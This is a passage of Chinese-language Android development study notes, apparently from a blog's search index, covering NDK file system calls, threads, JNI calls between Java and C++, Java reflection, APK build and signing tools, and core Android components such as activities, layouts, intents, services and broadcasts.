__mode); //更改文件权限 int chmod(const char* __path, mode_t __mode); int fchmod(int __fd, mode_t __mode); //创建目录 int mkdir(const char* __path, mode_t __mode); //遍历文件 DIR* opendir(const char* __path); 文件控制 fcntl的用途之一是针对一个打开的文件,获取或修改访问模式和状态标识. 要获取这些设置,应将fcntl的cmd参数设置为F_GETFL. //下述到吗可以测试文件是否以同步写方式打开 int nFlags; nFlags = fcntl(fd, F_GETFL); if(nFlags \u0026 O_SYNC){ //... } 文件属性 利用系统调用stat(),lstat(),fstat(),可以获取文件相关的信息. //返回文件的相关信息 int stat(const char* __path, struct stat* __buf); //与stat类似,区别,如果文件属于符号链接,那么返回的信息针对是的符号链接自身 int lstat(const char* __path, struct stat* __buf); //根据文件描述符获取文件的相关信息 int fstat(int __fd, struct stat* __buf); /* 系统调用stat()和lstat()无需对其所操作的文件本身拥有任何的权限,但是针对指定的pathname的父目录要有执行(搜素)权限.而fstat()系统调用只要文件描述符有效,总是成功. */ st_mode 示例 struct stat statBuf; stat(\"/data/local/tmp/2.txt\", \u0026statBuf); printf(\"st_uid = %d st_gid = %d st_size = %lld, st_mode = %o\\n\", statBuf.st_uid, statBuf.st_gid, statBuf.st_size, statBuf.st_mode); if (S_ISREG(statBuf.st_mode)) { printf(\"常规文件\\n\"); } if (statBuf.st_mode \u0026 S_IRUSR) { printf(\"拥有读权限\\n\"); } 目录权限 目录与文件拥有相同的权限方案,只是对3种权限的含义另有所指. 读权限:可列出目录之下的内容. 写权限:可在目录创建,删除文件. 可执行权限:可访问目录中的文件(搜索权限). 权限检查算法 对于特权级进程,授予所有访问权限. 若进程的有效用户ID与文件的用户ID相同,内核会根据文件的属主权限,授予进程相应的访问权限. 若进程的有效组ID与文件的组ID相匹配,内核会根据文件的属组权限,授予进程相应的访问权限. 若以上3点都不满足,内核会根据文件的其他权限,授予进程相应的访问权限. 示例 #include \u003cjni.h\u003e#include \u003cstring\u003e#include \u003cstdio.h\u003e #include \u003csys/types.h\u003e#include \u003csys/stat.h\u003e#include \u003cfcntl.h\u003e#include \u003cstdlib.h\u003e#include \u003cunistd.h\u003e #include \u003candroid/log.h\u003e#include \u003cerrno.h\u003e #define LOGD(...) __android_log_print(ANDROID_LOG_DEBUG, \"Luo\", __VA_ARGS__); #define LOGW(...) __android_log_print(ANDROID_LOG_WARN, \"Luo\", __VA_ARGS__); #define LOGE(...) __android_log_print(ANDROID_LOG_ERROR, \"Luo\", __VA_ARGS__); int main() { /* FILE* fp = fopen(\"/data/local/tmp/1.txt\", \"r\"); if (fp == NULL){ //当C库函数出错了,会将错误传给全局变量errno printf(\"fopen error %d\\n\", errno); //将错误转换为字符串 perror(\"fopen\"); //传errno,将错误字符串返回,方便界面显示 char* pErr = strerror(errno); printf(\"%s\\n\", pErr); }*/ int fd = open(\"/data/local/tmp/2.txt\", O_RDWR | O_CREAT, S_IRWXU); if (fd \u003c 0) { perror(\"open\"); } int bytes = write(fd, \"Hello\", 5); if (bytes \u003c 0) { perror(\"write\"); } else { printf(\"write bytes: %d\\n\", bytes); } if (lseek(fd, 0, SEEK_SET) \u003c 0) { close(fd); perror(\"lseek\"); return 0; } char szBuf[0x100] = {}; ssize_t readBytes = read(fd, szBuf, sizeof szBuf); if (readBytes \u003c 0) { close(fd); perror(\"read\"); return 0; } printf(\"szBuf = %s readBytes = %d\\n\", szBuf, readBytes); //获取文件属性 struct stat statBuf; stat(\"/data/local/tmp/2.txt\", \u0026statBuf); printf(\"st_uid = %d st_gid = %d st_size = %lld, st_mode = %o\\n\", statBuf.st_uid, statBuf.st_gid, statBuf.st_size, statBuf.st_mode); if (S_ISREG(statBuf.st_mode)) { printf(\"常规文件\\n\"); } if (statBuf.st_mode \u0026 S_IRUSR) { printf(\"拥有读权限\\n\"); } //修改文件权限 相同Uid才可以修改权限 Root用户除外 fchmod(fd, S_IRWXU); //检查文件权限 if (!access(\"/data/local/tmp/2.txt\", W_OK)){ printf(\"拥有写权限\\n\"); } close(fd); return 0; } 线程 两种状态 连接状态,pthread_join,会阻塞,等待线程结束拿线程返回值. 分离状态,pthread_detach,不会阻塞,节省内存开销. 终止线程 void pthread_exit(void *value_ptr); return /* 当一个线程设置了一个取消点,可使用下述API结束那个线程, 那个线程运行到取消点时,会结束线程 但遗憾的是,Android不允许使用此API */ int pthread_cancel(pthread_t thread); 线程同步 互斥体 //初始化 //可以使用全局变量初始化 pthread_mutex_t mutex = PTHREAD_MUTEX_INITIALIZER; //也可以使用API初始化 int pthread_mutex_init(pthread_mutex_t *restrict","date":"2021-10-21","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/ndk%E5%BC%80%E5%8F%91/:6:2","tags":["NDK"],"title":"NDK开发","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/ndk%E5%BC%80%E5%8F%91/"},{"categories":["Android基础"],"content":"混合编程JNI ","date":"2021-10-21","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/ndk%E5%BC%80%E5%8F%91/:7:0","tags":["NDK"],"title":"NDK开发","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/ndk%E5%BC%80%E5%8F%91/"},{"categories":["Android基础"],"content":"概述 Java Native Interface Java =\u003e JNI =\u003exxx(动态库 so) xxx(动态库 so) =\u003e JNI =\u003eJava 两边互调应满足以下条件 so文件应该导出函数,在函数前加JNIEXPORT. 类型匹配,Java要调C++,首先类型应该匹配,在Jni.h中已定义好. 调用约定,在函数前加JNICALL. 如果是C++,防止名称粉碎,在函数前加extern “C” 名称规范问题 为了防止误调so中的导出函数,应以包名_类名_函数名来命名 可以使用javah.exe将编译好的class文件给这个exe, 它会扫描类声明,看到native会自动创建头文件 不过这样还是很麻烦的,AndroidStodio已集成该工具 ","date":"2021-10-21","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/ndk%E5%BC%80%E5%8F%91/:7:1","tags":["NDK"],"title":"NDK开发","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/ndk%E5%BC%80%E5%8F%91/"},{"categories":["Android基础"],"content":"Java调C++ 在Java类中添加声明, 声明前加native关键字. Alt + Enter,创建Jni方法. ","date":"2021-10-21","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/ndk%E5%BC%80%E5%8F%91/:7:2","tags":["NDK"],"title":"NDK开发","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/ndk%E5%BC%80%E5%8F%91/"},{"categories":["Android基础"],"content":"Java反射 //拿目标对象 //① // Class cls = MainActivity.class; //② 本身有对象 //Class cls = this.getClass(); //③ 常用, 通过类名拿 try { Class cls = Class.forName(\"org.example.luojni.MainActivity\"); //new 对象 //不带构造new对象 Object obj = cls.newInstance(); //带构造new对象 Constructor constructor = cls.getConstructor(); //传构造参数即可 obj = constructor.newInstance(10); //调方法 传参数是为了防止有歧义,因为函数可以重载 //①拿方法 Method method = cls.getMethod(\"MyAdd\", int.class, int.class); //②拿方法 修改方法的访问权限 当方法为private时 第①种方式会拿不到 method = cls.getDeclaredMethod(\"MyAdd\", int.class, int.class); //修改方法的访问权限 method.setAccessible(true); //为了统一 返回值为Object //如果为静态方法 第一个参数给null就可以了 Object ret = method.invoke(obj, 1, 2); //若返回值为整型 就转为整型的包装类 int nResult = ((Integer) ret).intValue(); //反射字段 //①拿字段 Field field = cls.getField(\"mData\"); //②拿字段 修改字段的访问权限 当字段为private时 第①种方式会拿不到 field = cls.getDeclaredField(\"mData\"); //修改字段的访问权限 field.setAccessible(true); //修改字段值 field.setInt(obj, 1); //获取字段值 nResult = field.getInt(obj); } catch (ClassNotFoundException | NoSuchMethodException e) { e.printStackTrace(); } catch (IllegalAccessException e) { e.printStackTrace(); } catch (InvocationTargetException e) { e.printStackTrace(); } catch (NoSuchFieldException e) { e.printStackTrace(); } catch (InstantiationException e) { e.printStackTrace(); } Java反射的强大之处在于可以修改方法和字段的访问权限. ","date":"2021-10-21","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/ndk%E5%BC%80%E5%8F%91/:7:3","tags":["NDK"],"title":"NDK开发","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/ndk%E5%BC%80%E5%8F%91/"},{"categories":["Android基础"],"content":"C++调Java C++操作Java中的字符串以及数组 Java中声明函数,以及使用. C++中操作. extern \"C\" JNIEXPORT jstring JNICALL Java_org_example_luojni_MainActivity_fun1(JNIEnv *env, jobject thiz, jstring str, jbyteArray ary) { //操作Java中的字符串 int nLen = env-\u003eGetStringLength(str); //传false 说明不拷贝缓冲区,跟Java中用的是同一个缓冲区 jboolean flag = false; const char* psz = env-\u003eGetStringUTFChars(str, \u0026flag); LOGD(\"len = %d str = %s\\n\", nLen, psz); //操作Java中的数组 int nCount = env-\u003eGetArrayLength(ary); jbyte * p = env-\u003eGetByteArrayElements(ary, \u0026flag); for (int i = 0; i \u003c nCount; ++i) { LOGD(\"%d \", p[i]); } //返回String return env-\u003eNewStringUTF(\"Hello Ret\"); } C++反射调Java 写一个Java类. 在Java中声明native方法并调用. 在C++中反射调Java. //参数信息描述 //I(int) F(float) D(double) J(long) Z(bool) C(char) S(short) Ljava/lang/String(String) //一维数组 [i(int[]) //二维数组 [[i(int[][]) extern \"C\" JNIEXPORT void JNICALL Java_org_example_luojni_MainActivity_fun2(JNIEnv *env, jobject thiz) { //反射 //拿Java类 jclass cls = env-\u003eFindClass(\"org/example/luojni/MyClass\"); //new对象 //传\"\u003cinit\u003e\" 就是拿构造 jmethodID construct = env-\u003eGetMethodID(cls, \"\u003cinit\u003e\", \"()V\"); //构造若是有参数就传参, 这个函数是不定参的 jobject obj = env-\u003eNewObject(cls, construct); //调方法 //非静态方法 //()V 括号内写参数 后面写返回值 jmethodID fun1 = env-\u003eGetMethodID(cls, \"fun1\", \"()V\"); env-\u003eCallVoidMethod(obj, fun1); //静态方法 jmethodID fun2 = env-\u003eGetStaticMethodID(cls, \"fun2\", \"()V\"); env-\u003eCallStaticVoidMethod(cls, fun2); //示例 jmethodID Add = env-\u003eGetMethodID(cls, \"Add\", \"(II)I\"); //检查Java中的异常 if (env-\u003eExceptionCheck()){ //打印异常栈信息 env-\u003eExceptionDescribe(); //清除异常信息 为了不让程序崩 env-\u003eExceptionClear(); return; } jint nRet = env-\u003eCallIntMethod(obj, Add, 1, 6); //修改字段 jfieldID mData = env-\u003eGetFieldID(cls, \"mData\", \"I\"); env-\u003eSetIntField(obj, mData, 200); //引用计数 我们在C++中New了一个对象 Java虚拟机如何知道何时释放对象 //释放字符串或数组对象 可以调env-\u003eRelease... env-\u003eDeleteLocalRef(obj); } 加密 Java的逆向相对于C++来说比较容易,将Java中的所有代码都用C++反射来调用,然后对C++层进行加密. 注意 在C++中反射调Java无视权限(public private). ","date":"2021-10-21","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/ndk%E5%BC%80%E5%8F%91/:7:4","tags":["NDK"],"title":"NDK开发","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/ndk%E5%BC%80%E5%8F%91/"},{"categories":["Android基础"],"content":"源代码 C++调Java.7z ","date":"2021-10-21","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/ndk%E5%BC%80%E5%8F%91/:7:5","tags":["NDK"],"title":"NDK开发","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/ndk%E5%BC%80%E5%8F%91/"},{"categories":["Android基础"],"content":"Android开发 ","date":"2021-10-20","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/android%E5%BC%80%E5%8F%91/:0:0","tags":["Android开发"],"title":"Android开发","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/android%E5%BC%80%E5%8F%91/"},{"categories":["Android基础"],"content":"Java ","date":"2021-10-20","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/android%E5%BC%80%E5%8F%91/:1:0","tags":["Android开发"],"title":"Android开发","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/android%E5%BC%80%E5%8F%91/"},{"categories":["Android基础"],"content":"开发环境 环境配置 Jdk下载 https://www.oracle.com/java/technologies/downloads/ 环境变量 JAVA_HOME //这里写jdk的安装路径 //如:C:\\Program Files\\Java\\jdk1.8.0_151 Path: %JAVA_HOME%\\bin;%JAVA_HOME%\\jre\\bin; CLASSPATH: .;%JAVA_HOME%\\lib\\dt.jar;%JAVA_HOME%\\lib\\tools.jar; 编译运行Java程序 代码示例 Hello.java //包名 //开头-项目名称-功能 //公司用com, 个人用org, 官方用java开头 //包里面的以点分割的字段, 分别对应一个文件夹名 package org.hello.main; import org.hello.math.Math; public class Hello { public static void main(String[] args) { System.out.println(\"1 + 2 = \" + Math.add(1, 2)); } } Math.java package org.hello.math; public class Math { public static int add(int n1, int n2) { return n1 + n2; } } 注意 文件名和类名一致 一个类对应一个文件 包里面的以点分割的字段,分别对应一个文件夹名 编译运行 应用的示例代码为上面的 文件夹结构 编译 javac -cp C:\\Users\\XiaLuoHun\\Desktop\\LuoJavaTest Hello.java 运行 java org.hello.main.Hello Java编译运行.rar Eclipse导出Java工程 运行Java的可执行Jar文件 ","date":"2021-10-20","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/android%E5%BC%80%E5%8F%91/:1:1","tags":["Android开发"],"title":"Android开发","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/android%E5%BC%80%E5%8F%91/"},{"categories":["Android基础"],"content":"数据类型 ","date":"2021-10-20","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/android%E5%BC%80%E5%8F%91/:1:2","tags":["Android开发"],"title":"Android开发","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/android%E5%BC%80%E5%8F%91/"},{"categories":["Android基础"],"content":"关键字 final //类似于C++中的const final int n = 1; 运算符 int n = 1; n \u003e\u003e= 1;//Java中都是有符号数的, 右移补符号位 n \u003e\u003e\u003e= 1;//高位补0 abstract, extends public abstract class IShape{ //抽象方法 abstract public void fun1(); //非抽象方法 public void fun2(){ } } //Java无多重继承 public class LuoLine extends IShape{ @Override public void fun1() { } } interface, implements //接口类1 public interface Interface1 { public void fun1(); } //接口类2 public interface Interface2 { public void fun2(); } //多重继承也是有需求的,如:两个基类都是接口类的情况下 public class LuoTest implements Interface1, Interface2{ @Override public void fun1() { } @Override public void fun2() { } } ","date":"2021-10-20","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/android%E5%BC%80%E5%8F%91/:1:3","tags":["Android开发"],"title":"Android开发","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/android%E5%BC%80%E5%8F%91/"},{"categories":["Android基础"],"content":"包装类 模板 public class LuoList\u003cT\u003e{ public void push_back(T e){ } } //Java中的模板是假的模板,没有编译预处理的说法,即不存在替换代码 //上述代码编译后为下面的代码 public class LuoList{ public void push_back(Object e){ } } //Java中的泛型编程,只能传对象进去,且这个对象是Object的派生类 //我们通常写的一个类,编译器默认添加extend Object, 即默认是Object的派生类 //Java为每个基本类型都生成了一个类对象 //int -\u003e Integer, double -\u003e Double, float -\u003e Float, short -\u003e Short LuoList\u003cInteger\u003e LuoAry = new LuoList\u003cInteger\u003e(); LuoAry.push_back(1);//等价于LuoAry.push_back(new Integer(1)); LuoAry.push_back(2); Java中的基本数据类型没有方法和属性, 而包装类就是为了让这些拥有方法和属性,实现对象化交互. int n = Integer.parseInt(\"100\"); float f = Float.parseFloat(\"10.88\"); ","date":"2021-10-20","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/android%E5%BC%80%E5%8F%91/:1:4","tags":["Android开发"],"title":"Android开发","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/android%E5%BC%80%E5%8F%91/"},{"categories":["Android基础"],"content":"流程控制语句 跳出多重循环 //Java中没有goto, 但可以使用break Label //下面语句的意思是,当j == 3时, 跳出下面的两层循环, 打印Hello Java Label1: for (int i = 0; i \u003c 3; i++){ for (int j = 1; j \u003c 4; j++){ System.out.println(i * j); if ( j == 3){ break Label1; } } } System.out.println(\"Hello Java\"); ","date":"2021-10-20","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/android%E5%BC%80%E5%8F%91/:1:5","tags":["Android开发"],"title":"Android开发","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/android%E5%BC%80%E5%8F%91/"},{"categories":["Android基础"],"content":"内部类 public class Hello{ private int m_nData1 = 1; //当内部类不是静态的时候, 他有两个this指针 public class LuoHello { private int m_nData2 = 100; public void Luofun() { //因为有两个this指针, 这里可以访问m_nData1成员 m_nData1 = 10; System.out.println(\"LuoHello m_nData1 = \" + m_nData1 + \" m_nData2 = \" + m_nData2); } } private void fun(){ System.out.println(\"Hello m_nData1 = \" + m_nData1); //new LuoHello这个内部类的时候, 偷偷将Hello的this指针传了进去 LuoHello Luo = new LuoHello(); Luo.Luofun(); } public static void main(String[] args) { Hello Hun = new Hello(); Hun.fun(); } } ","date":"2021-10-20","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/android%E5%BC%80%E5%8F%91/:1:6","tags":["Android开发"],"title":"Android开发","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/android%E5%BC%80%E5%8F%91/"},{"categories":["Android基础"],"content":"集合类的使用 List Set Map ","date":"2021-10-20","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/android%E5%BC%80%E5%8F%91/:1:7","tags":["Android开发"],"title":"Android开发","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/android%E5%BC%80%E5%8F%91/"},{"categories":["Android基础"],"content":"库的使用 百度搜索 java api, 可看到官方网址: https://docs.oracle.com/javase/8/docs/api/ ","date":"2021-10-20","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/android%E5%BC%80%E5%8F%91/:1:8","tags":["Android开发"],"title":"Android开发","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/android%E5%BC%80%E5%8F%91/"},{"categories":["Android基础"],"content":"Android ","date":"2021-10-20","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/android%E5%BC%80%E5%8F%91/:2:0","tags":["Android开发"],"title":"Android开发","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/android%E5%BC%80%E5%8F%91/"},{"categories":["Android基础"],"content":"概述 Android网站 Android开发者 https://developer.android.google.cn/ 体系架构 最底层,Linux内核. HAL层,硬件抽象层,为了不修改Linux代码,因为一旦修改了,就必须开源,Linux开源协议是gpl协议. Lib库层,C语言写的,类似于Windows的API. ART虚拟机,Dalvik虚拟机已经淘汰了,从Android5.0开始使用ART虚拟机. Java Api框架,Java代码写的,让程序员可以用Java调用C. 应用层,提供各种各样的控件,直接调用. Jvm 编译方式 .java文件-\u003e.class文件-\u003e.jar文件 架构 基于堆栈 Dvm 编译方式 .java文件-\u003e.class文件-\u003e.dex文件 .dex文件 压缩版的.jar文件. 将所有的.class文件合并为一个.dex文件,减少冗余 如:两个class文件中有相同的字符串,这样合并为.dex文件时 相同的字符串只保留了一份. 架构 基于寄存器 ","date":"2021-10-20","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/android%E5%BC%80%E5%8F%91/:2:1","tags":["Android开发"],"title":"Android开发","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/android%E5%BC%80%E5%8F%91/"},{"categories":["Android基础"],"content":"AndroidStudio 下载 在Android开发者网站下载 https://developer.android.google.cn/ 安装SDK 安装虚拟机 开启虚拟机开发者模式 在设置中,一直点击版本号. 在开发者模式中,开启USB调试. 快捷键 重命名 Shift + F6 注释 Ctrl + Shift + / 代码格式化 Ctrl + Alt + L 所选代码封装为方法 Ctrl + Alt + M 后退 Ctrl + Alt + 向左箭头 前进 Ctrl + Alt + 向右箭头 快速代码生成 Alt + Insert 方法参数提示 Ctrl + P 查看类方法 Ctrl + F12 类结构窗口 Alt + 7 类继承图 Ctrl + H ","date":"2021-10-20","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/android%E5%BC%80%E5%8F%91/:2:2","tags":["Android开发"],"title":"Android开发","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/android%E5%BC%80%E5%8F%91/"},{"categories":["Android基础"],"content":"APK的生成 APK结构 res目录中的xml文件为二进制格式,称为AXML SDK目录工具 aapt.exe res(编译前的资源)-\u003e aapt.exe(aapt2.exe) -\u003e resources.arsc + res(AXML) + AndroidManifest.xml. 可将编译前的资源文件转换成APK文件中的资源文件,也可将APK文件中的资源文件转换成编译前的资源文件. javac.exe .java文件-\u003ejavac.exe-\u003e.class文件 dx.bat(d8.bat) 将编译前的*.class文件-\u003edx.bat(d8.bat)-\u003e.dex文件 (老版是用dx.bat, 新版是用d8.bat) zip压缩算法打包 res(AXML) + AndroidManifest.xml + .dex + resources.arsc -\u003e .apk zipalign.exe 此工具,与dx.bat同目录. 上述生成的.apk文件,需经此工具进行对齐(AndroidStudio生成的apk文件自动对齐),目的是要确保所有未压缩数据的开头均相对于文件开头部分执行特定的对齐. apksigner.bat(数字签名 RSA) 此工具,与dx.bat同目录. 对上述apk文件,进行数字签名,系统才会安装此apk. 签名在apk文件解压缩后的META-INF文件夹中. apk签名 V1签名机制只校验了现有的文件,没有校验整个apk文件,这就导致了,可以通过向apk中添加文件达到劫持注入的目的. 签名后的文件,在工程根目录中的app目录下的release目录下. ","date":"2021-10-20","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/android%E5%BC%80%E5%8F%91/:2:3","tags":["Android开发"],"title":"Android开发","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/android%E5%BC%80%E5%8F%91/"},{"categories":["Android基础"],"content":"本地化应用 中文系统,界面就显示中文;英文系统,界面就显示英文. 向strings.xml添加字符串 修改activity_main.xml中的字符串引用为strings.xml中的 复制values文件,添加后缀zh 修改values-zh中的strings.xml中的内容为中文 ","date":"2021-10-20","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/android%E5%BC%80%E5%8F%91/:2:4","tags":["Android开发"],"title":"Android开发","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/android%E5%BC%80%E5%8F%91/"},{"categories":["Android基础"],"content":"Activity 提供窗口供应用在其中绘制界面,此窗口通常会填满屏幕,但也可能比屏幕小,并浮动在其他窗口上面. 新建一个Activity 新建一个类 在AndroidManifest.xml文件中说明 快速创建Activity 启动新界面 生命周期 在Avtivity中重写上述虚函数 进程和应用生命周期 ","date":"2021-10-20","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/android%E5%BC%80%E5%8F%91/:2:5","tags":["Android开发"],"title":"Android开发","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/android%E5%BC%80%E5%8F%91/"},{"categories":["Android基础"],"content":"布局 概念 AS新建布局 设置布局 绝对布局 指明子组件的绝对位置,对于不同尺寸的手机来说,适配性较差. \u003c!-- 与父窗口同宽 --\u003e android:layout_width=\"match_parent\" \u003c!-- 与文本同高 --\u003e android:layout_height=\"wrap_content\" 线性布局 用于使所有子视图在单个方向(垂直或水平)保持对齐. \u003c!-- 指定布局方向(垂直或者水平) --\u003e android:orientation=\"horizontal\" \u003c!-- 权重,上图中两控件宽度为0,一个权重为1,一个权重为3, 表示将父窗口宽度划分为4份,一个占1份,一个占3份 --\u003e android:layout_weight 相对布局 不能设置权重,目前AS支持很差,已被约束布局取代. 帧布局 一个控件可以覆盖在另一个控件上. 应用场景:切换界面. 表格布局 用的很少,可以用线性布局来做. 约束布局 主流布局,在相对布局的基础上加上权重. 查看别人的布局 要确保AS和模拟器连接上,方可在下方选择进程,查看布局. ","date":"2021-10-20","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/android%E5%BC%80%E5%8F%91/:2:6","tags":["Android开发"],"title":"Android开发","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/android%E5%BC%80%E5%8F%91/"},{"categories":["Android基础"],"content":"控件相关 华丽界面示例 创建一个xml文件. 写下按钮被按下和未被按下所应用的图片. 修改button的背景. button修改完成. 模拟Android系统操作xml文件 TextView EditText Button 按钮消息响应 自定义一个事件监听类. 按钮注册监听. CheckBox RadioButton 列表组件 数据适配器 上图展示了数据源、适配器、列表控件之间的关系. 我们知道,数据源是各种各样的,而ListView所展示数据的格式则是有一定的要求的. 数据适配器正是建立了数据源与ListView之间的适配. 常用适配器 ArrayAdapter 只能操作一个控件,如下述中在操作了TextView控件后,不能修改图片控件. 新建一个布局文件, 记录每行的UI. 设置. SimpleAdapter 新建一个布局文件. 设置 自定义适配器 不用考虑通用性. 示例 新建一个布局文件. 写一个类,继承BaseAdapter. 调用 源代码 控件相关.rar ","date":"2021-10-20","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/android%E5%BC%80%E5%8F%91/:2:7","tags":["Android开发"],"title":"Android开发","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/android%E5%BC%80%E5%8F%91/"},{"categories":["Android基础"],"content":"菜单 选项菜单 新建一个menu文件夹. 新建一个menu Xml文件. 重写onCreateOptionsMenu函数,产生菜单. 重写onOptionsItemSelected函数,处理菜单消息. 上下文菜单 存放菜单相关信息,同上. 注册菜单(示例给ListView注册菜单). 重写onCreateContextMenu函数,产生菜单. 重写onContextItemSelected函数,处理菜单消息. 源代码 事件处理模型.rar ","date":"2021-10-20","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/android%E5%BC%80%E5%8F%91/:2:8","tags":["Android开发"],"title":"Android开发","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/android%E5%BC%80%E5%8F%91/"},{"categories":["Android基础"],"content":"提示信息 ","date":"2021-10-20","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/android%E5%BC%80%E5%8F%91/:2:9","tags":["Android开发"],"title":"Android开发","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/android%E5%BC%80%E5%8F%91/"},{"categories":["Android基础"],"content":"消息对话框 ","date":"2021-10-20","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/android%E5%BC%80%E5%8F%91/:2:10","tags":["Android开发"],"title":"Android开发","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/android%E5%BC%80%E5%8F%91/"},{"categories":["Android基础"],"content":"事件处理模型 基于多态机制 使用场景 触摸,按键. 示例 重写虚函数. 基于监听接口 使用场景 按钮. 监听过程 事件接口 示例 外部类(基本不用) 新建一个类实现监听接口. 给按钮注册监听器. 内部类(常用) 当按钮较多时,直接由Activity实现监听接口 匿名类(常用) 跟内部类没有区别, 匿名类会由编译器自动生成为内部类, 生成的类名通常为外部类名$1 外部类名$2… 基于系统设置 Configuration类专门用于描述手机设备上的配置信息. 基于消息循环 Android中只有主线程可操作UI,其他线程操作UI会崩,考虑同步的话会降低效率. 自己创建消息循环 在Android开发者网站搜索Looper类. 源代码 事件处理模型.rar ","date":"2021-10-20","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/android%E5%BC%80%E5%8F%91/:2:11","tags":["Android开发"],"title":"Android开发","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/android%E5%BC%80%E5%8F%91/"},{"categories":["Android基础"],"content":"Intent(意图) 3个信息 行为, 指定要执行的通用操作(例如,查看或选取)的字符串. 数据. 类别,一个包含应处理Intent组件类型的附加信息的字符串. 注册意图 Activity中的意图不能只给行为,也要给类别. 显示Intent 如打车,明确告诉从哪条路走,无跨进程概念. 用Intent来传输数据 这里启动另一个Activity,将用户名和密码传过去(即便跨进程,也可以将数据传过去),然后另一个Activity将真正的密码传回来,最后取回传回来的数据并显示. 启动一个Activity并传数据. 另一个Activity接收数据. 接收Activity销毁后传回来的数据. 隐式Intent 如点外卖,不用关心外卖是如何送到的,可跨进程. 在Manifest说明权限. 请求权限. 获取请求权限结果. 启动别人的Activity 以自己写的为例. 设置闹铃. 打电话. 源代码 Intent(意图).rar ","date":"2021-10-20","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/android%E5%BC%80%E5%8F%91/:2:12","tags":["Android开发"],"title":"Android开发","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/android%E5%BC%80%E5%8F%91/"},{"categories":["Android基础"],"content":"服务 是一种可在后台执行长时间运行操作而不提供界面的应用组件. 创建服务 创建一个类,继承Service. 注册服务. 启动与停止服务. 本进程和服务进行通讯 创建一个内部类,继承Binder. 在onBind函数中,返回Binder对象. 创建一个ServiceConnection对象. 绑定服务. 注意 服务默认运行在主线程中. 跨进程操作服务 在高版本的Android系统中,自建服务的跨进程操作,只能在创建服务的子进程中进行操作,只有系统服务,所有进程可操作. 将服务放在创建服务的子进程中 跨进程启动和停止服务 跨进程通讯 AIDL 利用内核,进行进程间的通讯. 使用AIDL创建绑定服务 创建.aidl文件. 在.aidl文件中声明接口. 此时编译整个工程,会发现编译器帮我们创建了一个ICount的接口. 实现声明的接口. 在另一个进程中,重写服务连接函数. 若两个工程,需要把aidl文件拷贝过去. 绑定服务,解绑服务,与服务进行通讯. 前台服务 UI放在通知栏. 在Manifest文件声明权限. 创建渠道ID. 创建前台服务. 源代码 服务1.rar 服务2.rar ","date":"2021-10-20","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/android%E5%BC%80%E5%8F%91/:2:13","tags":["Android开发"],"title":"Android开发","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/android%E5%BC%80%E5%8F%91/"},{"categories":["Android基础"],"content":"广播 广播是一种状态的通知,例如我想知道手机网络状态变化,此时我只要注册一个网络状态变化的广播,当系统网络状态发生变化的时候,系统就会发广播,我就可以收到. 广播电台 有序广播 接收广播的时候按优先级,优先级高的先接收到广播,可选择是否中断广播,让后面优先级低的接收不到广播. 无序广播 接收广播的时候无优先级,谁注册了都可以接收到此广播. 本地广播 效率高,不需要跨应用发送广播,可选本地广播. 广播接收者 创建一个类继承BroadcastReceiver 注册广播 静态注册 在Manifest文件中进行说明,高版本目前不允许(即便静态注册了,也不会收到广播), 当然也有例外. 为了兼容老版本,在高版本中静态注册会变成动态注册,但必须软件运行起来方可接收到广播. 动态注册 发送带权限的广播 接收系统广播示例 系统常见广播 以接收系统短信广播为例 